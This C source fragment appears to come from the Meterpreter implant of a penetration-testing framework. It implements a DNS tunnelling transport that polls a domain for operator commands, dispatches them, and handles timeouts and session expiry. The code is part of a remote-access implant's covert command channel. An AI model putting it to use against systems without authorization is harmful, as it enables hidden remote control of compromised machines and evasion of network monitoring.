 * @brief The servers main dispatch loop for incoming requests using DNS
 * @param remote Pointer to the remote endpoint for this server connection.
 * @param dispatchThread Pointer to the main dispatch thread.
 * @returns Indication of success or failure.
 */
static DWORD server_dispatch_dns(Remote* remote, THREAD* dispatchThread)
{
    BOOL running = TRUE;
    LONG result = ERROR_SUCCESS;
    Packet* packet = NULL;
    THREAD* cpt = NULL;
    DWORD ecount = 0;
    DWORD delay = 0;
    Transport* transport = remote->transport;
    DnsTransportContext* ctx = (DnsTransportContext*)transport->ctx;

    while (running)
    {
        if (transport->timeouts.comms != 0 && transport->comms_last_packet + transport->timeouts.comms < current_unix_timestamp())
        {
            dprintf("[DISPATCH] Shutting down server due to communication timeout");
            break;
        }

        if (remote->sess_expiry_end != 0 && remote->sess_expiry_end < current_unix_timestamp())
        {
            dprintf("[DISPATCH] Shutting down server due to hardcoded expiration time");
            dprintf("Timestamp: %u  Expiration: %u", current_unix_timestamp(), remote->sess_expiry_end);
            break;
        }

        if (event_poll(dispatchThread->sigterm, 0))
        {
            dprintf("[DISPATCH] server dispatch thread signaled to terminate...");
            break;
        }

        dprintf("[DISPATCH] Reading data from the DNS: %S", ctx->domain);


        result = packet_receive_dns(remote, &packet);

        if (result != ERROR_SUCCESS)
        {
            // Update the timestamp for empty replies
            if (result == DNS_INFO_NO_RECORDS)
            {
                transport->comms_last_packet = current_unix_timestamp();
            }
            delay = 10 * ecount;
            if (ecount >= 10)
            {
                delay *= 10;
            }
            ecount++;
            dprintf("[DISPATCH] no pending packets, sleeping for %d ms...", min(10000, delay));
            Sleep(min(10000, delay));
        }
        else
        {
            transport->comms_last_packet = current_unix_timestamp();
            // Reset the empty count when we receive a packet
            ecount = 0;
            dprintf("[DISPATCH] Returned result: %d, %x", result, packet);
            running = command_handle(remote, packet);
            dprintf("[DISPATCH] command_process result: %s", (running ? "continue" : "stop"));
        }

    }
    return result;
}

/*!
 * @brief Destroy the DNS transport.
 * @param transport Pointer to the DNS transport to reset.
 */
static void transport_destroy_dns(Transport* transport)
{

    DnsTransportContext* ctx = (DnsTransportContext*)transport->ctx;

    dprintf("[TRANS DNS] Destroying transport for DNS %S", ctx->domain);

    if (ctx != NULL)
    {
            SAFE_FREE(ctx->domain);
            SAFE_FREE(ctx->ns_server);
            SAFE_FREE(ctx->server_id);
            SAFE_FREE(ctx->pip4);
            ctx->ready = FALSE;
    }
    SAFE_FREE(transport);

}

void transport_write_dns_config(Transport* transport, MetsrvTransportDns* config)
{
    DnsTransportContext* ctx = (DnsTransportContext*)transport->ctx;

    config->common.comms_timeout = transport->timeouts.comms;
    config->common.retry_total = transport->timeouts.retry_total;
    config->common.retry_wait = transport->timeouts.retry_wait;
    wcsncpy(config->common.url, transport->url, URL_SIZE);

    if (ctx->ns_server)
    {
        wcsncpy(config->ns_server, ctx->ns_server, NS_NAME_SIZE);
    }

    if (ctx->client_id)
    {
        wcsncpy(config->client_id, ctx->client_id, 2);
    }

    if (ctx->server_id)
    {
        wcsncpy(config->server_id, ctx->server_id, 256);
    }
}

/*!
 * @brief Create an DNS transport from the given settings.
 * @param config Pointer to the DNS configuration block.
 * @return Pointer to the newly configured/created DNS transport instance.
 */
Transport* transport_create_dns(MetsrvTransportDns* config)
{
    Transport* transport = (Transport*)malloc(sizeof(Transport));
    DnsTransportContext* ctx = (DnsTransportContext*)malloc(sizeof(DnsTransportContext));
    wchar_t *domain;

    dprintf("[TRANS DNS] Creating DNS transport for domain %S", config->common.url);

    memset(transport, 0, sizeof(Transport));
    memset(ctx, 0, sizeof(DnsTransportContext));

    transport->timeouts.comms = config->common.comms_timeout;
    transport->timeouts.retry_total = config->common.retry_total;
    transport->timeouts.retry_wait = config->common.retry_wait;
    transport->type = METERPRETER_TRANSPORT_DNS;

    domain = wcsstr(config->common.url, L"dns://");
    transport->url = _wcsdup(config->common.url);

    if (domain == NULL)
    {
        domain = config->common.url;
    }

    ctx->domain = _wcsdup(domain + 6);
    ctx->client_id = _wcsdup(config->client_id);
    ctx->server_id = _wcsdup(config->server_id);
    ctx->ns_server = _wcsdup(config->ns_server);
    ctx->counter = 0; //TODO: GET COUNTER FROM THE CONFIG
    ctx->pip4 = NULL;

    transport->packet_transmit = packet_transmit_via_dns;
    transport->server_dispatch = server_dispatch_dns;
    transport->transport_init = server_init_windns;
    transport->transport_deinit = server_deinit_dns;
    transport->transport_destroy = transport_destroy_dns;
    transport->ctx = ctx;
    transport->comms_last_packet = current_unix_timestamp();

    return transport;
}
